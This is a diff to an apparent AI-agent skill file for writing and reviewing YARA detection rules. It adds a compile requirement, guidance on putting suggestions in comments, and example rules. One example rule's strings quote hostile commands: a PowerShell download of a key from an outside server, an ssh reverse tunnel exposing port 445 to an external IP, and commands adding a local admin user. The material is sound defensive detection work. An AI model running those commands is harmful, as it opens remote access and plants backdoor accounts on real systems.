@@ -1,12 +1,13 @@
 ---
 name: yara-skill
-version: 1.1
 description: Expert YARA rule authoring, review, and optimization. Use when writing new YARA rules, reviewing existing rules for quality issues, optimizing rule performance, or converting detection logic to YARA syntax. Covers rule naming conventions, string selection, condition optimization, performance tuning, and automated quality checks based on yaraQA.
 ---
 
 # YARA Rule Authoring & Review
 
 Expert guidance for writing high-quality, performant YARA rules based on industry best practices and automated QA checks.
+
+> **Version:** 1.2 — Added compilation requirement and commented suggestion patterns
 
 > **Scope:** This skill covers readability, maintainability, and usability. For performance optimization (atoms, short-circuit evaluation), see the Performance Reference.
 
@@ -421,6 +422,19 @@ condition:
 
 When reviewing an existing rule, produce an **Assessed Rule** with inline comments rather than a fully rewritten version. This educates the author while preserving their original decisions.
 
+### Critical Requirements
+
+**1. MUST COMPILE — Non-negotiable**
+- Every rule you output must compile successfully with `yara -p rule.yar`
+- Never include references to undefined string identifiers (e.g., `all of ($op*)` when no `$op*` strings exist)
+- Never break YARA syntax (unclosed braces, invalid modifiers, malformed hex)
+- If a suggestion would require adding strings that don't exist, put it in a comment instead
+
+**2. Suggestions go in comments only**
+- All recommendations, improvement ideas, and "consider adding..." notes must be in `//` or `/* */` comments
+- Do not modify the condition to use string groups that aren't defined
+- Do not add placeholder references that would cause compilation failures
+
 ### Principles
 
 1. **Fix only obvious issues** — PA1, meta typos, missing mandatory fields
@@ -469,6 +483,63 @@ rule MAL_Amaranth_Loader_Aug23 {   // naming: add category prefix (MAL_) and dat
       and any of ($ama*)
 }
 ```
+
+### Common Mistake to Avoid
+
+**DON'T — Broken condition (references undefined strings):**
+```yara
+strings:
+   $x1 = "malware.exe"
+condition:
+   uint16(0) == 0x5a4d
+   and all of ($op*)   // ERROR: no $op* strings defined!
+```
+
+**DO — Valid rule with suggestions in comments:**
+```yara
+strings:
+   $x1 = "malware.exe"
+   // Consider adding opcode patterns for more robust detection:
+   // $op1 = { 8B 45 08 50 E8 ?? ?? ?? ?? 83 C4 04 }
+condition:
+   uint16(0) == 0x5a4d
+   and $x1
+   // If you add $op* strings above, you could use: and all of ($op*)
+```
+
+### Good Example — Proper Naming, Meta, and Commented Suggestions
+
+```yara
+rule HKTL_Unknown_Feb26_1 {
+   meta:
+      description = "Detects an unknown hack tool that downloads SSH key from external server, creates reverse SSH tunnel for SMB (port 445) and adds local admin user"
+      author = "Detection Engineering"
+      score = 75
+      reference = "VT:8e593c36433be810f6753257b849d5d2417dc40081e1ef6a2078f75c06382033"
+      hash1 = "8e593c36433be810f6753257b849d5d2417dc40081e1ef6a2078f75c06382033"
+   strings:
+      $x1 = "powershell.exe wget https://pentest.emptybox.ge/secretkey -outfile C:\\users\\public\\secretkey"
+      $x2 = "ssh -R 445:127.0.0.1:445 hacker@46.101.108.130 -N -i C:\\users\\public\\secretkey"
+      $x3 = "icacls C:\\users\\public\\secretkey /grant:r %USERNAME%:F"
+      $x4 = "hackme.pdb"
+      $x5 = "net user eve qwerty /add"
+      $x6 = "net localgroup administrators eve /add"
+      // Consider adding opcodes for compiled/encoded variants:
+      // $op1 = { E8 ?? ?? ?? ?? 8B F0 85 F6 74 ?? }
+   condition:
+      uint16(0) == 0x5a4d
+      and filesize < 10KB
+      and 1 of ($x*)
+      // If $op* strings are added above, consider: and any of ($op*)
+}
+```
+
+**Key points from this example:**
+- Proper rule name with category (`HKTL_`), descriptor, and date
+- Complete metadata (description, author, score, reference, hash)
+- All improvement suggestions are in `//` comments
+- The rule compiles as-is; comments show potential enhancements
+- Multi-line condition with commented alternative logic
 
 ---
 
